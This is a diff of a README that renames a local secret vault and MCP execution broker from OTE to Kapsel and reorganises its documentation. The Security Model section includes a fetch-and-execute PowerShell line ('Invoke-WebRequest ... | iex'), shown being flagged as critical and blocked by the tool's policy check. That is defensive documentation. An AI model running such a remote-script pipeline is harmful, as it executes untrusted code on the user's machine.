@@ -1,22 +1,20 @@
-# OTE
+# Kapsel
 
-**One Time Execution**
-
-OTE is a local secret vault, execution broker, MCP server, and `.env` replacement for AI-assisted development.
-
-It is built for teams that want strong local security without losing DX.
+Kapsel is a local secret vault, policy engine, execution broker, and stdio MCP server for AI-assisted development.
 
 The goal is simple:
 
 - keep raw secrets on the machine
 - keep the agent out of the vault
-- keep commands inside a policy layer
+- keep command execution inside a policy boundary
 - make MCP setup predictable
 - make `.env` workflows safer and easier to automate
 
-## Problem
+This repository now keeps all documentation in this single file.
 
-Classic `.env` workflows break down when AI tools enter the picture.
+## Why Kapsel Exists
+
+Classic `.env` workflows break down when AI tooling enters the picture.
 
 The usual failure modes are:
 
@@ -24,13 +22,13 @@ The usual failure modes are:
 - secrets get copied into prompts or logs
 - command execution becomes raw shell passthrough
 - every MCP client needs manual setup
-- env handling is inconsistent across Node.js, Python, and CLI tools
+- env handling becomes inconsistent across Node.js, Python, and CLI tools
 
-OTE exists to replace that mess with a local, structured boundary.
+Kapsel exists to replace that mess with a local, structured boundary.
 
-## What OTE Does
+## What Kapsel Does
 
-OTE gives you:
+Kapsel gives you:
 
 - protected local secret storage
 - redacted secret projections
@@ -39,40 +37,19 @@ OTE gives you:
 - a stdio MCP server
 - MCP installers for common clients
 - a Layers bridge for `.env` migration
-- low-overhead runtime behavior
+- low overhead runtime behavior
 - cross-platform packaging
 
-OTE does not give the agent:
+Kapsel does not give the agent:
 
-- raw SKs
+- raw secret values
 - decrypted vault payloads
 - direct config file writes
 - path-policy bypass
 
-## Why OTE Is Different
+## Core Model
 
-OTE is not just another dotenv helper.
-It is closer to a local trust boundary for AI tooling.
-
-That means:
-
-- the agent can ask for what it needs
-- the agent can inspect metadata
-- the agent can request execution through the broker
-- the agent cannot grab the secret itself
-
-This is useful when you want:
-
-- AI env security
-- secret exposure prevention
-- dotenv replacement
-- local MCP setup
-- safer command execution
-- consistent `.env` behavior across runtimes
-
-## Core Concepts
-
-### 1. Vault
+### Vault
 
 Secrets are stored locally in protected form under the project root.
 
@@ -83,7 +60,7 @@ The vault only exposes:
 - allowed keys
 - protector name
 
-### 2. Broker
+### Broker
 
 Commands do not go straight to the shell.
 They go through a broker that validates:
@@ -95,25 +72,25 @@ They go through a broker that validates:
 - allowed environment
 - execution mode
 
-### 3. MCP
+### MCP
 
-OTE ships a local stdio MCP server.
+Kapsel ships a local stdio MCP server.
 Agents can use it as tooling without seeing raw secret values.
 
-### 4. Layers
+### Layers
 
-Layers turns a normal `.env` into a proxy for OTE.
+Layers turns a normal `.env` into a proxy for Kapsel.
 
 That lets application code keep using:
 
 - `process.env` in Node.js
 - `os.environ` in Python
 
-while the real values stay inside OTE.
+while the real values stay inside Kapsel.
 
 ## Execution Modes
 
-OTE supports three execution modes:
+Kapsel supports three execution modes:
 
 - `safe`
 - `permission`
@@ -145,196 +122,51 @@ The broker still enforces policy checks, but skips the approval prompt.
 
 Use this only when the caller is trusted.
 
-## Quick Start
+## Policy Model
 
-```bash
-ote --setup
-ote --doctor
-ote --migration
-ote mcp doctor
-```
+The default config file is JSON even though it uses a `.config` suffix.
 
-If you already have a project `.env`:
+Recommended fields:
 
-```bash
-ote --migration
-```
+- `sandbox.enabled`
+- `sandbox.allowed_paths`
+- `sandbox.denied_paths`
+- `sandbox.allowed_env`
+- `runtime.default_shell`
+- `runtime.execution_mode`
+- `runtime.cache_dir`
 
-That migrates the file into OTE-managed storage and rewrites the `.env` into a proxy.
-
-## `.env` Proxy Model
-
-After migration, the `.env` becomes a small proxy:
-
-```env
-# Managed by OTE
-OTE_PROFILE=prod
-```
-
-The source of truth moves into OTE.
-The file stays useful to the application runtime.
-
-## Layers Workflow
-
-Use Layers when you want OTE to sit between the runtime and the old `.env` workflow.
-
-Helpful commands:
-
-```bash
-ote bridge manifest [profile]
-ote bridge materialize [profile]
-ote bridge env [profile]
-ote bridge run [--profile <name>] [shell] <command>
-```
-
-### `ote bridge manifest`
-
-Prints the bridge metadata for a profile.
-
-### `ote bridge materialize`
-
-Returns the resolved environment values as a structured payload.
-
-### `ote bridge env`
-
-Prints shell-friendly key/value lines for the managed environment.
-
-### `ote bridge run`
-
-Runs a child process with the managed environment already applied.
-
-Examples:
-
-```bash
-ote bridge run --profile prod node server.js
-ote bridge run --profile prod python app.py
-ote bridge run --profile prod echo %API_KEY%
-```
-
-If a matching secret does not exist yet, OTE can migrate the local `.env` on first use.
-
-## MCP
-
-OTE ships a local stdio MCP server so agents can use it as tooling without direct secret exposure.
-
-Key commands:
-
-```bash
-ote mcp manifest
-ote mcp config
-ote mcp install <target>
-ote mcp install --print
-ote mcp install --config <path>
-ote mcp doctor
-ote mcp serve
-```
-
-### MCP Features
-
-- manifest generation
-- secret projection tools
-- path and status resources
-- local execution broker access
-- client config generation
-- merge-safe install into existing config
-
-### Supported Install Targets
-
-- `claude`
-- `cursor`
-- `vscode`
-- `windsurf`
-- `custom`
-
-### MCP Install Behavior
-
-`ote mcp install` only updates `mcpServers.ote`.
-
-It does not overwrite the rest of the file.
-
-Examples:
-
-```bash
-ote mcp install claude
-ote mcp install cursor
-ote mcp install vscode
-ote mcp install windsurf
-ote mcp install --config ./mcp.json
-ote mcp install --print
-```
-
-### Example MCP JSON
+Example:
 
 ```json
 {
-  "mcpServers": {
-    "ote": {
-      "command": "C:\\OTE\\build-gcc\\ote.exe",
-      "args": ["mcp", "serve"],
-      "cwd": "C:\\OTE"
-    }
+  "version": 1,
+  "sandbox": {
+    "enabled": true,
+    "allowed_paths": ["./"],
+    "denied_paths": [],
+    "allowed_env": ["PATH", "SYSTEMROOT", "WINDIR", "HOME", "USERPROFILE", "TMP", "TEMP"]
+  },
+  "runtime": {
+    "default_shell": "cmd",
+    "execution_mode": "safe",
+    "cache_dir": ".ote/cache"
   }
 }
 ```
 
-### MCP Doctor
-
-`ote mcp doctor` validates:
-
-- executable path
-- project root
-- config validity
-- manifest generation
-- broker availability
-
-## Common Client Setup
-
-### Claude Desktop
-
-Use `ote mcp install claude` when you want OTE to write the local config for you.
-
-### Cursor
-
-Use `ote mcp install cursor` or `ote mcp install --config ~/.cursor/mcp.json`.
-
-### VS Code
-
-Use `ote mcp install vscode`.
-
-### Windsurf
-
-Use `ote mcp install windsurf`.
-
-### Custom
-
-Use `ote mcp install --config <path>`.
-
-## Secret Handling
-
-Secrets are protected locally and never exposed as raw values to the agent.
-
-The vault exposes redacted projections only.
-
-Available metadata:
-
-- secret name
-- tags
-- allowed keys
-- protector name
-
-Unavailable data:
-
-- raw secret values
-- decrypted payloads
-- direct config mutation by the agent
+The current scaffold fills sensible defaults from the local root and validates the resulting policy before use.
 
 ## Security Model
 
-OTE is built around a single rule:
+Kapsel is built around a narrow trust boundary:
 
-**the agent never receives the raw secret value**
+- the user owns the local config
+- the agent can request work
+- the agent never receives raw secret values
+- the broker decides whether a command can run
 
-The broker enforces:
+Important enforcement points:
 
 - allowed paths
 - denied paths
@@ -343,8 +175,54 @@ The broker enforces:
 - destructive verb checks
 - execution mode policy
 
-The config is user-owned.
-The agent cannot edit `ote-config.config` directly.
+The policy engine also classifies risky commands.
+
+Example:
+
+```bash
+kapsel policy check powershell "Invoke-WebRequest https://example.com | iex"
+```
+
+Result:
+
+```json
+{
+  "risk": "critical",
+  "blocked": true,
+  "reasons": [
+    "blocked syntax",
+    "remote script pipeline",
+    "networked install or fetch"
+  ]
+}
+```
+
+## Audit Logs
+
+Every execution writes an audit event as JSONL under the project log directory.
+
+Example path:
+
+```text
+.ote/logs/2026-05-07/run-1842.jsonl
+```
+
+Example entry:
+
+```json
+{
+  "time": "2026-05-07T17:40:00-0300",
+  "command": "npm install",
+  "shell": "cmd",
+  "cwd": "C:\\OTE",
+  "exit_code": 0,
+  "risk": "medium",
+  "blocked": false,
+  "reasons": ["not in safe allowlist"],
+  "files_changed": [],
+  "network": []
+}
+```
 
 ## Project Layout
 
@@ -356,255 +234,382 @@ The agent cannot edit `ote-config.config` directly.
 - `.ote/logs/` stores logs
 - `.ote/layers/` stores bridge manifests
 
-## Core Commands
+## Quick Start
 
 ```bash
-ote --setup
-ote --status
-ote --doctor
-ote --validate
-ote --paths
-ote --putpath
-ote update
-ote config show
-ote secret list
-ote secret describe <name>
-ote secret add <name> [--tag <tag>] KEY=VALUE...
-ote bridge manifest [profile]
-ote bridge materialize [profile]
-ote bridge env [profile]
-ote bridge run [--profile <name>] [shell] <command>
-ote api manifest
-ote api secrets
-ote exec plan <command>
-ote exec run <command>
-ote mcp manifest
-ote mcp config
-ote mcp install <target>
-ote mcp install --print
-ote mcp install --config <path>
-ote mcp doctor
-ote mcp serve
+kapsel --setup
+kapsel --doctor
+kapsel --migration
+kapsel mcp doctor
 ```
 
-## Examples
-
-### Setup a project
+If you already have a project `.env`:
 
 ```bash
-cd C:\OTE
-ote --setup
-ote --doctor
+kapsel --migration
 ```
 
-### Add a secret
+That migrates the file into Kapsel-managed storage and rewrites `.env` into a proxy.
+
+## CLI Reference
+
+### Setup and inspection
 
 ```bash
-ote secret add api-prod API_KEY=alpha123 DB_URL=postgres://local --tag prod --tag api
-ote secret list
-ote secret describe api-prod
+kapsel --setup
+kapsel --status
+kapsel --doctor
+kapsel --validate
+kapsel --paths
+kapsel --putpath
+kapsel update
 ```
 
-### Inspect the active config
+- `kapsel --setup` initializes the project layout
+- `kapsel --status` prints platform, architecture, broker, and config state
+- `kapsel --doctor` checks the local runtime and policy
+- `kapsel --validate` validates the user-owned config
+- `kapsel --paths` prints every important on-disk path
+- `kapsel --putpath` adds Kapsel to the user PATH on Windows
+- `kapsel update` checks the latest GitHub release and stages a download
+
+### Config
 
 ```bash
-ote config show
-ote --paths
-ote --status
+kapsel config show
 ```
 
-### Plan a command
+### Secrets
 
 ```bash
-ote exec plan echo hello
-ote exec plan powershell Get-ChildItem
+kapsel secret list
+kapsel secret describe <name>
+kapsel secret add <name> [--tag <tag>] KEY=VALUE...
 ```
 
-### Run a command
+- `secret.list` returns redacted projections
+- `secret.describe` returns one redacted projection
+- `secret.add` stores a protected secret locally
+
+### Execution
 
 ```bash
-ote exec run echo hello
-ote exec run cmd echo hello
+kapsel exec plan <command>
+kapsel exec run <command>
+kapsel policy check <command>
 ```
 
-### Migrate a `.env`
+`policy check` is the safest entry point when you want a risk answer without execution.
+
+### Layers
 
 ```bash
-ote --migration
+kapsel bridge manifest [profile]
+kapsel bridge materialize [profile]
+kapsel bridge env [profile]
+kapsel bridge run [--profile <name>] [shell] <command>
 ```
 
-### Use the bridge
+### MCP
 
 ```bash
-ote bridge env
-ote bridge run --profile prod node server.js
+kapsel mcp manifest
+kapsel mcp config
+kapsel mcp install <target>
+kapsel mcp install --print
+kapsel mcp install --config <path>
+kapsel mcp doctor
+kapsel mcp serve
 ```
 
-### Generate MCP config
+## Execution Examples
 
 ```bash
-ote mcp config
-ote mcp doctor
+kapsel exec plan echo hello
+kapsel exec plan powershell Get-ChildItem
+kapsel exec run echo hello
+kapsel exec run cmd echo hello
 ```
 
-### Install MCP config
+Safe, read-only commands are the intended default.
+
+## MCP
+
+Kapsel ships a local stdio MCP server for agent tooling.
+
+Start it with:
 
 ```bash
-ote mcp install claude
-ote mcp install cursor
-ote mcp install vscode
-ote mcp install windsurf
-ote mcp install --config ./mcp.json
+kapsel mcp serve
 ```
 
-### Put OTE on PATH
+The server speaks framed JSON-RPC over standard input and output.
+
+### Manifest
+
+Generate the manifest with:
 
 ```bash
-ote --putpath
+kapsel mcp manifest
 ```
 
-## Update Flow
+The manifest tells the agent:
+
+- the current platform
+- the current architecture
+- the active protector
+- the available tool surface
+
+### Tools
+
+The MCP server exposes these tools:
+
+- `secret.list`
+- `secret.describe`
+- `secret.add`
+- `exec.plan`
+- `exec.run`
+- `policy.check`
+- `status`
+- `paths`
+- `config.show`
+
+### Resources
+
+The server also exposes read-only resources:
+
+- `kapsel://status`
+- `kapsel://paths`
+- `kapsel://config`
+- `kapsel://manifest`
+- `kapsel://root`
+
+### Client Setup
+
+Kapsel can generate and install MCP client config for:
+
+- `claude`
+- `cursor`
+- `vscode`
+- `windsurf`
+- `custom`
+
+Useful commands:
 
 ```bash
-ote update
+kapsel mcp config
+kapsel mcp install claude
+kapsel mcp install cursor
+kapsel mcp install vscode
+kapsel mcp install windsurf
+kapsel mcp install --config ./mcp.json
+kapsel mcp install --print
+kapsel mcp doctor
 ```
 
-The update command:
+`kapsel mcp install` merges only `mcpServers.kapsel`, leaving the rest of the file intact.
+`kapsel mcp doctor` validates the local executable, project root, config, and manifest.
 
-- checks the latest GitHub release
-- compares it with the local version
-- downloads the matching asset into the cache
-- stages the extracted package for the next step
+### Example MCP JSON
+
+```json
+{
+  "mcpServers": {
+    "kapsel": {
+      "command": "C:\\OTE\\build-gcc\\kapsel.exe",
+      "args": ["mcp", "serve"],
+      "cwd": "C:\\OTE"
+    }
+  }
+}
+```
+
+### Recommended Agent Flow
+
+1. read `kapsel mcp manifest`
+2. inspect `status` and `paths`
+3. use `secret.list` and `secret.describe` to choose the right profile
+4. call `policy.check` or `exec.plan` before `exec.run`
+5. keep `safe` as the default mode
+6. request `permission` only when a human is present
+
+## Agent Integration
+
+The agent can ask Kapsel to do work.
+The agent cannot see raw secrets.
+
+Suggested prompts:
+
+- "List available secret profiles for deployment."
+- "Describe the redacted keys for `api-prod`."
+- "Build an execution plan for `git status`."
+- "Run this read-only command through Kapsel."
+
+Do not ask Kapsel to:
+
+- print secret values
+- dump decrypted vault contents
+- edit `ote-config.config`
+- execute outside the configured paths
+- bypass path checks
+
+Recommended installer flow:
+
+1. call `kapsel mcp config` to preview the JSON
+2. call `kapsel mcp install <target>` to merge into the client config
+3. call `kapsel mcp doctor` to verify local wiring
+4. restart or reload the client
+
+If the client is not one of the built-in targets, pass `--config <path>` and let Kapsel merge only `mcpServers.kapsel`.
+
+## Layers
+
+Layers is the bridge layer that turns a normal `.env` workflow into a local Kapsel-backed proxy.
+
+It migrates values from a project `.env` into Kapsel, writes a proxy file back to disk, and keeps the real values in the vault.
+
+### Workflow
+
+```bash
+kapsel --migration
+kapsel bridge manifest
+kapsel bridge materialize
+kapsel bridge env
+kapsel bridge run --profile prod node server.js
+```
+
+### Node.js
+
+The bridge package exposes a helper that injects managed values into `process.env`.
+
+### Python
+
+The Python bridge exposes the same idea for `os.environ`.
+
+The bridges are meant for local development workflows where the app still expects env vars, but the real values must stay protected.
+
+## Release
+
+Kapsel 1.1.0 is the current release line for this tree.
+
+Release checks:
+
+```bash
+kapsel --doctor
+kapsel --validate
+kapsel --status
+kapsel --putpath
+kapsel update
+kapsel mcp manifest
+kapsel mcp config
+kapsel mcp install <target>
+kapsel mcp doctor
+kapsel mcp serve
+```
+
+### Build
+
+```bash
+cmake -S . -B build-gcc
+cmake --build build-gcc -j 4
+```
+
+### Package
+
+The build uses CPack to produce archive artifacts for the release flow.
+
+### GitHub
+
+Repository:
+
+```text
+https://github.com/AnThophicous/kapsel
+```
+
+Remote:
+
+```text
+origin -> https://github.com/AnThophicous/kapsel.git
+```
+
+## Publishing
+
+Publishing is intentionally simple:
+
+1. initialize the repository
+2. push the branch
+3. create or update the GitHub release
+4. attach the packaged artifacts
+5. attach checksums
 
 ## Troubleshooting
 
-### "DLL not found" on Windows
-
-If Windows says a runtime DLL is missing, use the packaged release build or rebuild from the current tree.
-
-Current Windows packaging includes the MinGW runtime DLL that the GNU build needs.
-
-### "mcp doctor failed"
-
-Check:
-
-- project root exists
-- `ote.exe` path resolves correctly
-- config file is valid
-- the release asset matches the current platform
-
-### "bridge env failed: secret not found"
-
-Run `ote --migration` once in that project, or create the protected secret first.
-
-### "config invalid"
+### MCP tools are missing
 
 Run:
 
 ```bash
-ote --validate
+kapsel mcp manifest
+kapsel mcp doctor
 ```
 
-Then fix the reported issue in the user-owned config.
+If the MCP server is not visible to your client, verify:
 
-## Build
+- the config points to `kapsel.exe`
+- the `args` are `["mcp", "serve"]`
+- the `cwd` is the project root
+- `startup_timeout_sec` is large enough for your machine
 
-### Local Build
+### Policy check blocks a command
+
+That is usually expected.
+
+Use:
 
 ```bash
-cmake -S . -B build
-cmake --build build
-cmake --build build --target package
+kapsel policy check <command>
 ```
 
-### Windows Build Notes
+to see the risk level and reasons.
 
-On Windows GNU builds, OTE statically links the C++ runtime pieces it can and packages the required MinGW runtime DLL when needed.
+### Bridge env fails
 
-That is what keeps the downloaded zip from failing on launch because of a missing runtime DLL.
+If the bridge cannot materialize the env:
 
-## Cross-Platform Release
+- run `kapsel --migration` once
+- verify the secret exists
+- verify the profile name matches
 
-The release workflow targets:
+### Windows runtime DLL issues
 
-- Windows
-- Linux
-- macOS
-
-GitHub Actions builds the matrix and uploads release assets.
-
-## What GitHub Actions Does
-
-The release workflow:
-
-- checks out the repo
-- configures CMake
-- builds the project
-- packages the artifacts
-- uploads the per-platform assets
-- publishes the GitHub release
+Use the packaged release build or rebuild from the current tree.
 
 ## FAQ
 
-### Is OTE a secret manager?
+### Is Kapsel a secret manager?
 
 Yes. It is a local secret store designed to keep raw values off the agent surface.
 
-### Is OTE an `.env` replacement?
+### Is Kapsel an `.env` replacement?
 
 Yes. It is designed to replace the fragile parts of dotenv workflows.
 
-### Does OTE work with MCP?
+### Does Kapsel work with MCP?
 
-Yes. OTE ships a local MCP server and client installers.
+Yes. Kapsel ships a local MCP server and client installers.
 
-### Does OTE support Node.js and Python?
+### Does Kapsel support Node.js and Python?
 
 Yes. Layers is built for both runtime styles.
 
 ### Can the agent ever see the raw secret?
 
-No. That is the boundary OTE is built to preserve.
+No. That is the boundary Kapsel is built to preserve.
 
-### Can I use OTE on Windows, Linux, and macOS?
+### Can I use Kapsel on Windows, Linux, and macOS?
 
 Yes.
 
-## Search Keywords
+## Notes
 
-AI env security, dotenv replacement, secret exposure prevention, local secret store, local MCP server, MCP install, Claude Desktop MCP, Cursor MCP, VS Code MCP, Windsurf MCP, Codex CLI MCP, Node.js secret bridge, Python secret bridge, low overhead secret broker, environment proxy, protected secret vault, local policy layer.
-
-## International Terms
-
-- Portuguese: seguranca de `.env` para IA, substituto do dotenv, MCP local, protecao de segredo local
-- Spanish: seguridad de `.env` para IA, reemplazo de dotenv, servidor MCP local
-- French: securite `.env` pour IA, remplacement de dotenv, serveur MCP local
-
-## Docs
-
-The `docs/` folder contains deeper notes, but this README is the main user-facing document.
-
-- [docs/architecture.md](docs/architecture.md)
-- [docs/security.md](docs/security.md)
-- [docs/mcp.md](docs/mcp.md)
-- [docs/layers.md](docs/layers.md)
-- [docs/agent-integration.md](docs/agent-integration.md)
-- [docs/release.md](docs/release.md)
-- [docs/publishing.md](docs/publishing.md)
-
-## Release Status
-
-OTE 1.0.2 is the current release line for this tree.
-
-The current packaged Windows build includes the runtime DLL needed for the GNU build path.
-
-## Final Summary
-
-OTE is a local boundary for AI-assisted development:
-
-- secrets stay local
-- commands stay policy-checked
-- `.env` becomes a proxy
-- MCP setup becomes installable
-- runtime bridges stay simple
-- the agent stays useful without seeing the vault
+The public product name, CLI, MCP surface, docs, and repository name are Kapsel.
